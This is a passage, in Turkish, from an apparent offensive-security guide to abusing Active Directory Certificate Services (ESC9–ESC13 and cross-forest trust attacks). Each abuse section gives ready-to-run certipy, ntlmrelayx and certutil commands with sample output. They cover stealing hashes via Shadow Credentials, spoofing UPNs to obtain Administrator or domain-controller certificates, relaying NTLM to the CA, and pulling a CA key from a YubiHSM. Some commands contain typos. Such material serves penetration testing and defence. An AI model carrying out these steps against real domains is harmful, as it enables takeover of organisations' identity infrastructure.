[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Açıklama

Yeni değer **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) için **`msPKI-Enrollment-Flag`**, ESC9 olarak adlandırılır, bir sertifikada **yeni `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısının** gömülmesini engeller. Bu bayrak, `StrongCertificateBindingEnforcement` `1` (varsayılan ayar) olarak ayarlandığında önem kazanır; bu, `2` ayarıyla çelişir. Daha zayıf bir sertifika eşlemesinin Kerberos veya Schannel için istismar edilebileceği senaryolarda (ESC10'da olduğu gibi) önemi artar, çünkü ESC9'un yokluğu gereksinimleri değiştirmez.

Bu bayrağın ayarının önemli hale geldiği koşullar şunlardır:

* `StrongCertificateBindingEnforcement` `2` olarak ayarlanmamışsa (varsayılan `1`), veya `CertificateMappingMethods` `UPN` bayrağını içeriyorsa.
* Sertifika, `msPKI-Enrollment-Flag` ayarındaki `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı ile işaretlenmişse.
* Sertifika tarafından herhangi bir istemci kimlik doğrulama EKU'su belirtilmişse.
* Başka bir hesabı tehlikeye atmak için herhangi bir hesap üzerinde `GenericWrite` izinleri mevcutsa.

### İstismar Senaryosu

Diyelim ki `John@corp.local`, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip ve amacı `Administrator@corp.local`'ı tehlikeye atmaktır. `Jane@corp.local`'ın kaydolmasına izin verilen `ESC9` sertifika şablonu, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı ile yapılandırılmıştır.

İlk olarak, `Jane`'in hash'i, `John`'ın `GenericWrite`'ı sayesinde Shadow Credentials kullanılarak elde edilir:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Sonrasında, `Jane`'in `userPrincipalName`'i `Administrator` olarak değiştirilir, `@corp.local` alan kısmı kasıtlı olarak atlanır:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bu değişiklik, `Administrator@corp.local`'ın `Administrator`'ın `userPrincipalName`'i olarak farklı kalması koşuluyla kısıtlamaları ihlal etmez.

Bunun ardından, savunmasız olarak işaretlenmiş `ESC9` sertifika şablonu `Jane` olarak talep edilir:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Belirtilmiştir ki, sertifikanın `userPrincipalName` değeri `Administrator` olarak yansımaktadır ve herhangi bir “object SID” içermemektedir.

`Jane`'in `userPrincipalName` değeri daha sonra orijinaline, `Jane@corp.local` olarak geri döndürülmektedir:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Verilen sertifika ile kimlik doğrulama denemesi artık `Administrator@corp.local` NT hash'ini veriyor. Sertifikanın alan belirtimi eksik olduğundan, komut `-domain <domain>` içermelidir:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Zayıf Sertifika Eşleştirmeleri - ESC10

### Açıklama

ESC10 tarafından belirtilen iki kayıt defteri anahtar değeri alan denetleyicisinde bulunmaktadır:

* `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altında `CertificateMappingMethods` için varsayılan değer `0x18` (`0x8 | 0x10`), daha önce `0x1F` olarak ayarlanmıştı.
* `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altında `StrongCertificateBindingEnforcement` için varsayılan ayar `1`, daha önce `0` idi.

**Durum 1**

`StrongCertificateBindingEnforcement` `0` olarak yapılandırıldığında.

**Durum 2**

Eğer `CertificateMappingMethods` `UPN` bitini (`0x4`) içeriyorsa.

### Suistimal Durumu 1

`StrongCertificateBindingEnforcement` `0` olarak yapılandırıldığında, `GenericWrite` izinlerine sahip bir A hesabı, herhangi bir B hesabını tehlikeye atmak için kullanılabilir.

Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip bir saldırgan, `Administrator@corp.local` hesabını tehlikeye atmayı hedefler. Prosedür ESC9'u yansıtır ve herhangi bir sertifika şablonunun kullanılmasına izin verir.

İlk olarak, `Jane`'in hash'i Shadow Credentials kullanılarak elde edilir, `GenericWrite`'ı suistimal ederek.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Sonrasında, `Jane`'in `userPrincipalName`'i `Administrator` olarak değiştirilir, kısıtlama ihlalini önlemek için `@corp.local` kısmı kasıtlı olarak atlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bunun ardından, varsayılan `User` şablonunu kullanarak `Jane` olarak istemci kimlik doğrulamasını sağlayan bir sertifika talep edilir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName`'i daha sonra orijinaline, `Jane@corp.local` olarak geri döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Elde edilen sertifika ile kimlik doğrulama, `Administrator@corp.local`'ın NT hash'ini verecektir; bu, sertifikada alan bilgileri bulunmadığı için komutta alanın belirtilmesini gerektirir.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` içinde `UPN` bit bayrağı (`0x4`) bulunan bir A hesabı, `userPrincipalName` özelliğinden yoksun olan herhangi bir B hesabını, makine hesapları ve yerleşik alan yöneticisi `Administrator` dahil olmak üzere, tehlikeye atabilir.

Burada amaç, `Jane`'in hash'ini Shadow Credentials aracılığıyla elde ederek `DC$@corp.local`'ı tehlikeye atmaktır ve `GenericWrite`'ı kullanmaktır.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'in `userPrincipalName` değeri `DC$@corp.local` olarak ayarlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
`Jane` olarak varsayılan `User` şablonunu kullanarak bir istemci kimlik doğrulama sertifikası talep edilir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName`'i bu işlemden sonra orijinal haline geri döner.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel üzerinden kimlik doğrulamak için, Certipy'nin `-ldap-shell` seçeneği kullanılır ve kimlik doğrulama başarısı `u:CORP\DC$` olarak belirtilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell aracılığıyla, `set_rbcd` gibi komutlar, kaynak tabanlı kısıtlı delege etme (RBCD) saldırılarına olanak tanır ve bu da etki alanı denetleyicisini tehlikeye atabilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Bu zafiyet, `userPrincipalName`'ı olmayan veya `sAMAccountName` ile eşleşmeyen herhangi bir kullanıcı hesabını da kapsamaktadır; varsayılan `Administrator@corp.local`, yükseltilmiş LDAP ayrıcalıkları ve varsayılan olarak `userPrincipalName`'ın olmaması nedeniyle birincil hedefdir.

## NTLM'yi ICPR'ye İletme - ESC11

### Açıklama

Eğer CA Sunucusu `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa, RPC hizmeti aracılığıyla imzalamadan NTLM iletme saldırıları gerçekleştirilebilir. [Burada referans](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/) bulunmaktadır.

`Enforce Encryption for Requests` devre dışıysa, `certipy` kullanarak durumu belirleyebilirsiniz ve certipy `ESC11` Zafiyetlerini gösterecektir.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Bir relay sunucusu kurmak gerekiyor:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Not: Alan denetleyicileri için `-template` parametresini DomainController'da belirtmemiz gerekir.

Ya da [sploutchy'nin impacket çatallamasını](https://github.com/sploutchy/impacket) kullanarak:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell erişimi ile ADCS CA ve YubiHSM - ESC12

### Açıklama

Yönetici, Sertifika Otoritesini "Yubico YubiHSM2" gibi harici bir cihazda depolamak için ayarlayabilir.

USB cihazı CA sunucusuna bir USB portu aracılığıyla bağlıysa veya CA sunucusu sanal bir makineyse bir USB cihaz sunucusu varsa, YubiHSM'de anahtarları oluşturmak ve kullanmak için Anahtar Depolama Sağlayıcısı tarafından bir kimlik doğrulama anahtarı (bazen "şifre" olarak adlandırılır) gereklidir.

Bu anahtar/şifre, `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` altında açık metin olarak kayıt defterinde saklanır.

[Burada](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm) referans.

### Suistimal Senaryosu

Eğer CA'nın özel anahtarı fiziksel bir USB cihazında saklanıyorsa ve shell erişimi elde ettiyseniz, anahtarı geri almak mümkündür.

Öncelikle, CA sertifikasını (bu kamuya açıktır) elde etmeniz ve ardından:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Son olarak, CA sertifikası ve özel anahtarını kullanarak yeni bir keyfi sertifika oluşturmak için certutil `-sign` komutunu kullanın.

## OID Grup Bağlantı İstismarı - ESC13

### Açıklama

`msPKI-Certificate-Policy` niteliği, sertifika şablonuna ihraç politikasının eklenmesine olanak tanır. İhraç politikalarından sorumlu `msPKI-Enterprise-Oid` nesneleri, PKI OID konteynerinin Yapılandırma İsimlendirme Bağlamı'nda (CN=OID,CN=Public Key Services,CN=Services) keşfedilebilir. Bir politika, bu nesnenin `msDS-OIDToGroupLink` niteliği kullanılarak bir AD grubuna bağlanabilir ve bu, bir sistemin sertifikayı sunan bir kullanıcıyı grubun üyesiymiş gibi yetkilendirmesine olanak tanır. [Burada referans](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Diğer bir deyişle, bir kullanıcının bir sertifika kaydetme izni olduğunda ve sertifika bir OID grubuna bağlandığında, kullanıcı bu grubun ayrıcalıklarını miras alabilir.

OIDToGroupLink bulmak için [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kullanın:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

Bir kullanıcı izni bulun, `certipy find` veya `Certify.exe find /showAllPermissions` kullanabilir.

Eğer `John`, `VulnerableTemplate`'e kaydolma iznine sahipse, kullanıcı `VulnerableGroup` grubunun ayrıcalıklarını miras alabilir.

Tek yapması gereken şablonu belirtmek, OIDToGroupLink haklarına sahip bir sertifika alacaktır.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Sertifikalarla Ormanların Ele Geçirilmesi Pasif Sesle Açıklandı

### Ele Geçirilmiş CA'lar Tarafından Orman Güvenlerinin İhlali

**Çapraz orman kaydı** için yapılandırma oldukça basittir. **Kaynak ormandan gelen kök CA sertifikası**, yöneticiler tarafından **hesap ormanlarına yayımlanır** ve **kaynak ormandan gelen kurumsal CA** sertifikaları, her hesap ormanındaki `NTAuthCertificates` ve AIA konteynerlerine **eklenir**. Bu düzenleme, **kaynak ormandaki CA'ya**, yönettiği PKI için tüm diğer ormanlar üzerinde tam kontrol sağlar. Eğer bu CA **saldırganlar tarafından ele geçirilirse**, hem kaynak hem de hesap ormanlarındaki tüm kullanıcılar için sertifikalar **saldırganlar tarafından sahte olarak oluşturulabilir**, böylece ormanın güvenlik sınırı ihlal edilmiş olur.

### Yabancı Prensiplere Verilen Kayıt Ayrıcalıkları

Çoklu orman ortamlarında, **sertifika şablonları yayımlayan Kurumsal CA'lar** konusunda dikkatli olunmalıdır; bu şablonlar **Kimlik Doğrulanmış Kullanıcılar veya yabancı prensiplerin** (Kurumsal CA'nın ait olduğu ormanın dışındaki kullanıcılar/gruplar) **kayıt ve düzenleme haklarına** izin verir.\
Bir güven ilişkisi üzerinden kimlik doğrulama yapıldığında, **Kimlik Doğrulanmış Kullanıcılar SID**'si AD tarafından kullanıcının token'ına eklenir. Dolayısıyla, eğer bir alan, **Kimlik Doğrulanmış Kullanıcılar için kayıt hakları veren** bir Kurumsal CA'ya sahipse, bir **farklı ormandan bir kullanıcı tarafından bir şablon kaydedilebilir**. Benzer şekilde, eğer **bir şablon tarafından bir yabancı prense açıkça kayıt hakları verilirse**, bu durumda **çapraz orman erişim kontrol ilişkisi oluşturulur**, bu da bir ormandan bir prensibin **başka bir ormandan bir şablona kaydolmasını** sağlar.

Her iki senaryo da bir ormandan diğerine **saldırı yüzeyinin artmasına** yol açar. Sertifika şablonunun ayarları, bir saldırgan tarafından yabancı bir alanda ek ayrıcalıklar elde etmek için istismar edilebilir.
